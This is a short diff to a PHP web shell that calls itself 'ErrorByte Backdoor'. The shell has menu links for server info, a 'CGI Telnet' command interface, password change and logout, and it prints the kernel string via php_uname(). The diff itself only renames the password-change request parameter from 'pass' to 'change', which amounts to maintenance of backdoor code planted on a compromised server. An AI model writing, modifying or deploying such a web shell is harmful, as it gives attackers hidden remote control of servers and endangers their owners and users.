@@ -124,7 +124,7 @@ text-decoration: none;
 <center>
 <h1>ErrorByte Backdoor</h1>
 <hr>
-[ <a href="?">Home</a> ] [ <a href="?info">Info Server</a> ] [ <a href="?cgi">CGI Telnet</a> ] [ <a href="?pass">Change Password</a> ] [ <a href="?out">Logout</a> ]
+[ <a href="?">Home</a> ] [ <a href="?info">Info Server</a> ] [ <a href="?cgi">CGI Telnet</a> ] [ <a href="?change">Change Password</a> ] [ <a href="?out">Logout</a> ]
 </center>
 <?php
 if(isset($_REQUEST['out'])) {
@@ -134,7 +134,7 @@ if(isset($_REQUEST['out'])) {
 echo "<hr>";
 echo "Kernel : <font color='red'>".php_uname()."</font>";
 exit;
-} elseif(isset($_REQUEST['pass'])) {
+} elseif(isset($_REQUEST['change'])) {
 echo "<hr><form enctypr='multipart/post-data' method='post'>
 New Password : <input type='text' name='pass_baru' placeholder='$password'>
 <input type='submit' value='Change !'>
